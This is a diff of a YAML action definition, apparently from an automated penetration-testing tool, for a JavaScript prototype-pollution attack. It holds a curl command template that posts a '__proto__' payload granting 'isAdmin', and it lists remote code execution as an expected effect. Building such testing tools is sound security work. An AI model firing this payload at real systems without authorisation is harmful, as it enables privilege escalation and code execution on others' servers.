@@ -2,15 +2,21 @@ name: prototype_pollution
 category: web
 description: JavaScript prototype pollution
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -H 'Content-Type: application/json' -d '{{"__proto__":{{"isAdmin":true}}}}'"
-parser: null
+command_template: 'curl -s ''{target_url}'' -H ''Content-Type: application/json''
+  -d ''{{"__proto__":{{"isAdmin":true}}}}''
+
+  '
+parser: web_response_parser
 expected_effects:
-  - action_completed
+- pp_confirmed
+- rce_achieved
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Pollute Object.prototype to inject properties. Targets: Node.js merge/clone functions, JSON parsing. Can lead to RCE via child_process options pollution."
+mechanism: 'Pollute Object.prototype to inject properties. Targets: Node.js merge/clone
+  functions, JSON parsing. Can lead to RCE via child_process options pollution.'
+hacktricks_ref: pentesting-web/deserialization/README.md
